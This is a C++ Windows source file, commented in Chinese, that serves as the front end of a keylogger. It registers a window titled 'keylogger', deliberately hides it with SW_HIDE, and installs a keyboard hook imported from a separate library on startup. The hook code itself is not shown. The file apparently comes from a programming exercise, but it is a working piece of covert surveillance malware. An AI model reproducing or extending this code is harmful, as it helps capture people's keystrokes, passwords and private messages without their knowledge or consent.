#include <windows.h>

// 入口函数 Winmain

// HINSTANCE :应用程序实例句柄leixing
// LPSTR: char*

//安装钩子
extern "C" __declspec(dllimport) BOOL InstallHook();

// 卸载钩子
extern "C" __declspec(dllimport) BOOL UninstallHook();

#pragma comment(lib, "key.lib")

// 窗口处理函数
LRESULT CALLBACK WindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam);

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPreInstace, LPSTR lpCmdLine, int  nCmdShow)
{
	// 创建窗口
	TCHAR szAppClassName[] = TEXT("KEY");
	WNDCLASS wc = { 0 };
	wc.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH); //加载白色画刷
	wc.hCursor = LoadCursor(NULL, IDC_ARROW);	//加载光标
	wc.hInstance = hInstance;
	wc.lpfnWndProc = WindowProc;	//窗口处理函数 
	wc.lpszClassName = szAppClassName;	// 窗口类型名
	wc.style = CS_HREDRAW | CS_VREDRAW; //	窗口类的风格

	// 注册窗口
	RegisterClass(&wc);

	
	// 创建窗口
	HWND hWnd = CreateWindow(
		szAppClassName,	// 窗口类型名
		TEXT("键盘记录器"),	// 窗口标题
		WS_OVERLAPPEDWINDOW,	// 窗口的风格
		400, 200,	// 窗口左上角
		200, 200,	// 窗口的宽和高
		NULL,	// 父窗口句柄
		NULL,	// 菜单句柄
		hInstance,	// 应用程序实例句柄
		NULL	// 参数
		);

	// 显示窗口
	//ShowWindow(hWnd, SW_SHOW);
	ShowWindow(hWnd, SW_HIDE);	// 隐藏窗口

	// 更新窗口
	UpdateWindow(hWnd);

	// 消息循环
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
		// 将虚拟消息转换为字符消息
		TranslateMessage(&msg);
		// 将消息分发给窗口处理函数
		DispatchMessage(&msg);
	}
	return 0;
}

// 窗口处理函数
LRESULT CALLBACK WindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	//return 1; 屏蔽所有按键，危险操作
	switch (uMsg)
	{
	case WM_CREATE:	// 安装钩子
		InstallHook();
		break;
	case WM_CLOSE:	// 窗口关闭消息
		DestroyWindow(hWnd);
		break;
	case WM_DESTROY: // 窗口销毁消息
		UninstallHook();
		PostQuitMessage(0);
		break;
	}
	return DefWindowProc(hWnd, uMsg, wParam, lParam);
}